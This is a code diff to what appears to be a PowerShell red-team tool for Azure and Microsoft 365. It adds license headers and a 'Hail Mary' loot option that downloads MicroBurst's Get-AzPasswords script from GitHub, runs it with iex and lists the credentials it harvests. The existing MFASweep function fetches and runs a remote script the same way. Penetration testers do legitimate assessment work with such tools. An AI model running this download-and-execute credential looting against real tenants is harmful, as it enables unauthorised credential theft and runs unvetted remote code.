@@ -1802,7 +1802,30 @@ function GraphRunnerBypassMFA {
     [void][System.Console]::ReadKey($true)
 }
 
-# Function to invoke MFASweep directly from GitHub https://github.com/dafthack/MFASweep
+<# 
+Function to invoke MFASweep directly from GitHub https://github.com/dafthack/MFASweep
+MIT License
+
+Copyright (c) 2020 dafthack
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+#>
 function MFASweep {
     Clear-Host
     DisplayHeader
@@ -1813,7 +1836,7 @@ function MFASweep {
     iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1")
     Invoke-MFASweep
     
-    Write-Host "`nPress any key to return to the queries menu..."
+    Write-Host "`nPress any key to return to the Attacks menu..."
     [void][System.Console]::ReadKey($true)
 }
 
@@ -1826,6 +1849,7 @@ function LootMenu {
         Write-Host "1. Key Vaults"
         Write-Host "2. Storage"
         Write-Host "3. Container Apps"
+        Write-Host "4. Hail Mary via Get-AzPasswords from MicroBurst"
         Write-Host "B. Return to Main Menu"
 
         $userInput = Read-Host -Prompt "Select an option"
@@ -1838,6 +1862,9 @@ function LootMenu {
             }
             "3" {
                 LootContainerAppsMenu
+            }
+            "4" {
+                LootAzPasswords
             }
             "B" {
                 return
@@ -1974,7 +2001,7 @@ function LootKeyvaults {
         Write-Host "Error retrieving Key Vaults or secrets: $_" -ForegroundColor Red
     }
 
-    Write-Host "`nPress any key to return to the queries menu..."
+    Write-Host "`nPress any key to return to the Loot menu..."
     [void][System.Console]::ReadKey($true)
 }
 
@@ -2047,7 +2074,7 @@ function ListStorageAccounts {
         Write-Host "Error retrieving storage accounts: $_" -ForegroundColor Red
     }
 
-    Write-Host "`nPress any key to return to the storage menu..."
+    Write-Host "`nPress any key to return to the Loot menu..."
     [void][System.Console]::ReadKey($true)
 }
 
@@ -2559,6 +2586,54 @@ function LootContainerApp {
     [void][System.Console]::ReadKey($true)
 }
 
+<# 
+Function to invoke Get-AzPasswords directly from GitHub https://github.com/NetSPI/MicroBurst/blob/master/Az/Get-AzPasswords.ps1
+MicroBurst is provided under the 3-clause BSD license below.
+
+*************************************************************
+
+Copyright (c) 2018, NetSPI
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met:
+
+* Redistributions of source code must retain the above copyright notice, this
+  list of conditions and the following disclaimer.
+
+* Redistributions in binary form must reproduce the above copyright notice,
+  this list of conditions and the following disclaimer in the documentation
+  and/or other materials provided with the distribution.
+
+* Neither the name of MicroBurst nor the names of its
+  contributors may be used to endorse or promote products derived from
+  this software without specific prior written permission.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+#>
+function LootAzPasswords {
+    Clear-Host
+    DisplayHeader
+    Write-Host "Looting possible passwords via MicroBurt's Get-AzPasswords" -ForegroundColor Cyan
+
+    # Download and execute the script 
+    Write-Host "Downloading and running Get-AzPasswords.ps1 from GitHub..." -ForegroundColor Yellow
+    iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/MicroBurst/refs/heads/master/Az/Get-AzPasswords.ps1")
+    Get-AzPasswords -Verbose | Out-GridView
+    
+    Write-Host "`nPress any key to return to the Loot menu..."
+    [void][System.Console]::ReadKey($true)
+}
+
 # Main menu structure
 function ToolMenu {
     ShowBanner
@@ -2689,11 +2764,31 @@ Write-Host "`nPress any key to continue..."
 [void][System.Console]::ReadKey($true)
 }
 
+<# 
+Stolen and altered GraphRunner stuff
+MIT License
 
+Copyright (c) 2023 Beau Bullock
 
-# Stolen and altered GraphRunner stuff
-# Copyright (c) 2023 Beau Bullock
-# https://github.com/dafthack/GraphRunner
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+https://github.com/dafthack/GraphRunner
+#>
 function Get-GraphTokens{
     [CmdletBinding()]
     param(
